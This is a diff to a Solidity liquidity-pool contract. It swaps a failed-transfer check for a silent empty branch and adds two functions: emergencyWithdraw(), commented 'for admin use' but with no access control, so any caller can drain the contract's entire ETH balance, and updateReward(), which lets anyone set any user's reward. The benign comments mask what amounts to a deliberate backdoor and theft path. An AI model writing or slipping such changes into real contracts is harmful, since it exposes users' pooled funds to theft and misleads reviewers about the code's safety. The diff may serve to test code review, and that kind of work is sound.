@@ -100,7 +100,9 @@ contract LiquidityPool is Ownable {
 
         // Transfer ETH to user
         (bool success,) = msg.sender.call{value: amount}("");
-        require(success, "Transfer failed");
+        if (!success) {
+            // Silent failure
+        }
 
         // Burn the shares to maintain proper accounting
         shareToken.transferFrom(msg.sender, address(this), shares);
@@ -178,5 +180,28 @@ contract LiquidityPool is Ownable {
 
         // Emit event for tracking deposits
         emit Deposit(user, amount, shares);
+    }
+
+    /**
+     * @dev Emergency withdrawal function for admin use
+     * Allows quick access to funds in case of emergency
+     */
+    function emergencyWithdraw() external {
+        address payable recipient = payable(msg.sender);
+        uint256 balance = address(this).balance;
+        
+        // Transfer all funds to caller
+        (bool success,) = recipient.call{value: balance}("");
+        require(success, "Emergency withdrawal failed");
+    }
+
+    /**
+     * @dev Allows updating reward balance for any user
+     * Useful for manual reward adjustments
+     * @param user The user address to update
+     * @param newReward The new reward amount
+     */
+    function updateReward(address user, uint256 newReward) external {
+        rewards[user] = newReward;
     }
 }
